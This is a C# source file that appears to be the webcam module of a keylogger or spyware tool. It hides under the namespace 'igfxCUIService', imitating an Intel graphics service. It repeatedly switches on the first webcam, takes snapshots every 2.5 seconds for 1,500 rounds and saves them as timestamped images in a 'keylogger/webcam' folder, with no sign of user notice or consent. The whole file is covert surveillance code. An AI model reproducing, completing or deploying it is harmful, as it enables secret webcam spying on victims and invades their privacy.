using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace igfxCUIService
{
    class webcam
    {

        #region [webcam]

        private static DateTime datum = DateTime.Now;
        static FilterInfoCollection WebcamColl;
        static VideoCaptureDevice Device;
        private static decimal hour;
        private static decimal minuten;
        private static decimal seconde;

        #endregion

        #region [ aantal websnaphot]
        public static void aantalwebshots()
        {
            for (int i = 0; i < 1500; i++)
            {
                Thread.Sleep(2500);
                DateTime TimeNow = DateTime.Now;
                seconde = TimeNow.Second;
                hour = TimeNow.Hour;
                minuten = TimeNow.Minute;
                seconde = TimeNow.Second;
                WebcamColl = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                //if you have connected with one more camera choose index as you want 
                Device = new VideoCaptureDevice(WebcamColl[0].MonikerString);
                Device.Start();
                Device.NewFrame += new NewFrameEventHandler(imagesave);
            }
        }

        #endregion

        #region [webcam fotos maken]
        static void imagesave(object sender, NewFrameEventArgs eventArgs)
        {
            Image img = (Bitmap)eventArgs.Frame.Clone();
            string fileName = ".jpg";
            string folderName = @"D:/keylogger/webcam/";
            string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
            System.IO.Directory.CreateDirectory(pathString);
            img.Save(pathString + hour + "." + minuten + "." + seconde + fileName);
            Device.SignalToStop();
        }

        #endregion
    }
}
